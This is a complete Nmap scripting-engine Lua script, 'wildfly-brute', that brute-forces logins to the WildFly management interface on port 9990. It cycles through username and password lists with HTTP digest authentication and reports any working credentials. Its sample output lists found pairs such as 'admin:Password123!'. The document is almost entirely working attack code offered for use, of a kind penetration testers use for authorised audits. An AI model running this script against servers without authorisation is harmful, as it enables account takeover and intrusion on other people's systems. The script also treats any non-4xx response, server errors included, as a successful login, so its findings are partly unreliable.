local http = require "http"
local nmap = require "nmap"
local table = require "table"
local unpwdb = require "unpwdb"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
This script performs password guessing against systems that use Wildfly. For more information about Wildfly, visit http://wildfly.org/ and for more
information about Wildfly Exploitation, visit https://github.com/hlldz/wildPwn.
]]

---
-- @usage
-- nmap -p 9990 --script wildfly-brute --script-args "userdb=usernameList.txt,passdb=passList.txt,hostname=domain.com" <host>
--
-- @output
-- PORT     STATE SERVICE
-- 9990/tcp open  osm-appsrvr
-- | wildfly-brute:
-- |   Credentials Found:
-- |   manager:manager
-- |   admin:Password123!
-- |_  root:Administrator1-
----

author = "Halil DALABASMAZ | artofpwn.com"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"brute", "intrusive"}

portrule = shortport.port_or_service( {9990}, {"http", "https"}, "tcp", "open")

function is_login(host, port, path, method, username, password, hostname)

	local user_agent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"

	local options = {
		auth = { digest = true, },
		no_cache = true,
		bypass_cache = true,
		header = { }
	}

        options["auth"]["username"] = username
        options["auth"]["password"] = password
	options["header"]["User-Agent"] = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"

	if hostname then
		options["header"]["Host"] = hostname
	end

  	result = http.generic_request( host, port, method, path, options )
	if ( result.status < 400 or result.status > 499 ) then
		return true
    	end

	return false
end

action = function(host, port)

	local args = nmap.registry.args

	local control = false
	local result = { }
	local method = "GET"
	local path = "/management"
	local hostname = stdnse.get_script_args("wildfly-brute.hostname") or ""

	if ( not(path) ) then
    		return stdnse.format_output(false, "No path was specified (see wildlfy-brute.path)")
  	end

  	local response = http.generic_request( host, port, method, path, { no_cache = true } )

  	if ( response.status ~= 401 ) then
    		return ("  \n  Path \"%s\" does not require authentication"):format(path)
  	end

	local www_authenticated = response.header['www-authenticate']
	www_authenticated = www_authenticated:lower()

    	if string.find(www_authenticated, 'digest.-realm') then

		local usernames, passwords
		local try = nmap.new_try()

		usernames = try(unpwdb.usernames())
		passwords = try(unpwdb.passwords())

		for password in passwords do
  			for username in usernames do
				if is_login(host, port, path, method, username, password, hostname)
				then
					if control == false
					then
						control = true
						table.insert(result, "Credentials Found:")
					end

					table.insert(result, username .. ":" .. password)
				end
  			end
  			usernames("reset")
		end

		return result
	else
		return "Not Supported Digest"
	end

end
